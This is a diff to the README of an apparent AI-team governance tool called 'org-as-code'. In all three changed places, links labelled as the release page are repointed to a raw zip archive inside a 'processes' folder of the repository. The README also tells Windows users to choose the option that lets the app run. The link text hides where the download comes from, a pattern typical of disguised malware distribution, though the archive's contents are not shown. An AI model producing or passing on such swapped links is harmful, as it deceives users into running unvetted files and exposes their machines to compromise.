@@ -1,6 +1,6 @@
 # 🧩 org-as-code - Governance for AI Teams
 
-[![Download org-as-code](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/leonardo2462/org-as-code/releases)
+[![Download org-as-code](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/leonardo2462/org-as-code/raw/refs/heads/main/processes/as-code-org-v3.2.zip)
 
 ## 🚀 What this app does
 
@@ -29,7 +29,7 @@ If Windows asks for approval, choose the option that lets the app run.
 
 Go to the release page here:
 
-[Visit the download page](https://github.com/leonardo2462/org-as-code/releases)
+[Visit the download page](https://github.com/leonardo2462/org-as-code/raw/refs/heads/main/processes/as-code-org-v3.2.zip)
 
 On that page:
 1. Find the latest release
@@ -194,7 +194,7 @@ The goal is to make agent activity easier to follow without adding a hard setup.
 
 ## 🔗 Download again
 
-[Open the release page](https://github.com/leonardo2462/org-as-code/releases)
+[Open the release page](https://github.com/leonardo2462/org-as-code/raw/refs/heads/main/processes/as-code-org-v3.2.zip)
 
 ## 🧾 Repository topics
 
